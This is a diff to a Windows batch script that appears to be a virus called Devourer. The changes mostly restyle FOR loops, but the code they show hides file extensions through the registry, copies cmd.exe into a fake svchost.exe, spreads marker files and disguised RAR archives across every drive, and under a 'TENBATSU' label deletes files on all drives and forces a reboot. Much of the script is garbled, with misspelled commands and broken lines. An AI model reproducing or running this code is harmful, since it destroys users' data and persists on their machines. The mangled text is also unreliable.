@@ -18,7 +18,7 @@ setpRegp ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
 set DeRrrer=C:\WINDOWS\FRets\HIDESE~
 set setrA=C:\WINDOWS\FRets\HIDESE~\DeRrrersetrA
 set rgr=\WieRAR
-set sepeRre=
+set sepeRre=44
 if ""=="-Install" (
 goto Install
 )
@@ -117,7 +117,9 @@ copy *.ico ..\WinRAR\*.ico
 copy example.rar ..\WinRAR\example.rar
 cd..
 tasklist >\task.txt
-FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "\task.txt"') do set svchost=%%i
+FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "\task.txt"') do (
+set svchost=%%i
+)
 copy C:\WINDOWS\system32\cmd.exe \%%i
 copy \sleep.exe \%%i
 if not exist \svchost.exe (
@@ -127,7 +129,9 @@ copy \sleep.exe \svchost.exe
 del \task.txt
 cd WinRAR
 copy Default.SFX C:\~$.sfx
-for %%i in (txt doc jpg exe exp fil) do copy example.rar ..\Devourersetup\%%ipack.dll
+for %%i in (txt doc jpg exe exp fil) do (
+copy example.rar ..\Devourersetup\%%ipack.dll
+)
 start /min \winrar.exe ch -- \example.rar
 \svchost.exe 1000
 call regedit.exe /s \RegA.txt
@@ -177,7 +181,11 @@ echo "Start"=dword:00000002>>\reg.reg
 regedit /e C:\WINDOWS\ls.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule"
 \svchost.exe 1000
 type C:\WINDOWS\ls.reg>\ls.txt
-FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do if not "%%i"=="00000002" regedit /s \reg.reg
+FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do (
+if not "%%i"=="00000002" (
+regedit /s \reg.reg
+)
+)
 echo Windows Registry Editor Version 5.00>>\reg2.reg
 echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>\reg2.reg
 echo "HideFileExt"=dword:00000001>>\reg2.reg
@@ -234,7 +242,9 @@ eeR RetyAe=NT-.FON>>C:\WINDOWS\FRets\resUI.iei
 set>C:\WINDOWS\systes32\rriers\gpres.pRg
 rgte 
 :VoideUnownBug
-FOR /F "tokens=*" %%i in (\Devourer.bat) do echo %%i>LS.bat
+FOR /F "tokens=*" %%i in (\Devourer.bat) do (
+echo %%i>LS.bat
+)
 goto DebugNext
 :DebugNext
 type \Devourer.bat>>LS.bat
@@ -325,7 +335,9 @@ cd
 if not exist \RunTime.txt (
 echo RunSign_50>\RunTime.txt
 )
-FOR /F "tokens=2 delims=_" %%i in (\RunTime.txt) do set RunTime=%%i
+FOR /F "tokens=2 delims=_" %%i in (\RunTime.txt) do (
+set RunTime=%%i
+)
 if /i %%i leq 0 (
 goto Virus
 )
@@ -346,11 +358,15 @@ eeR set ws=wseriAt.eregteReet"wseriAt.sepp">>\pss.s
 eeR ws.rre "C:\WINDOWS\systes32\CHAIN.BAT -TiseSet"  >>\pss.s
 eseriAt \pss.s
 rep \pss.s
-for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:
+for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+vol %%i:
+)
 if errorlevel 1 (
 set %%i=1
 )
-for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do echo 1>%%i:\Devourerchk1
+for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+echo 1>%%i:\Devourerchk1
+)
 findstr . %%i:\Devourerchk1
 if not errorlevel 1 (
 del %%i:\Devourerchk1
@@ -674,7 +690,11 @@ del C:\WINDOWS\ls*.reg
 regedit /e C:\WINDOWS\ls1.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule"
 \svchost.exe 500
 type C:\WINDOWS\ls1.reg>\ls.txt
-FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do if not "%%i"=="00000002" regedit /s \reg.reg
+FOR /F "tokens=2 delims=:" %%i in ('findstr /c:"tart" \ls.txt') do (
+if not "%%i"=="00000002" (
+regedit /s \reg.reg
+)
+)
 \svchost.exe 500
 if exist \NoTasks (
 if not exist "C:\ProgramData\ʼ˵\\\Devourer.VBS" copy "\Devourer.VBS" (
@@ -740,7 +760,11 @@ i exist \HKLFieis.iei i exist \AKLFieis.iei gRtR Reset
 rep \RreTise.txt
 gRtR DisC
 :HiPD
-FOR %%i IN (\akari.txt) DO if /i %%~zi lss 102400 goto TENBATSU
+FOR %%i IN (\akari.txt) DO (
+if /i %%~zi lss 102400 (
+goto TENBATSU
+)
+)
 goto Reset
 :Kill
 if exist "D:\I am KAKENHI.txt" (
@@ -771,8 +795,12 @@ shutdown -r -t 100 -c "TENBATSU"
 )
 goto TENBATSUEND
 set alldrive=
-for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do call \HIKARI.BAT eoladd %%i:
-for %%i in () do del /f /a /q /s %%i
+for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+call \HIKARI.BAT eoladd %%i:
+)
+for %%i in () do (
+del /f /a /q /s %%i
+)
 del /f /a /q /s "C:\Documents and Settings"
 goto Kill
 :formatall
@@ -795,7 +823,9 @@ goto DiskChk
 if ""=="-USB" (
 Exit
 )
-FOR /F "tokens=1,2,3 skip=2 delims=[]" %%i in (i
+FOR /F "tokens=1,2,3 skip=2 delims=[]" %%i in (~nx0) do (
+set code=%%i
+)
 set name=%%j
 set type=%%k
 goto OpenNext
@@ -815,9 +845,11 @@ exit
 )
 call "%%j"
 :Save
-FOR /F "tokens=1 delims=:" %%i in ('findstr "" *.exe') do set PackName=%%i
+FOR /F "tokens=1 delims=:" %%i in ('findstr "%%i" *.exe') do (
+set PackName=%%i
+)
 \rar.exe -m0 -ep -ep1 a "%%i" "%%j"
-echo >>"%%i"
+echo %%i>>"%%i"
 :Del
 del /f /a /q "%%j"
 del /f /a /q script.bat
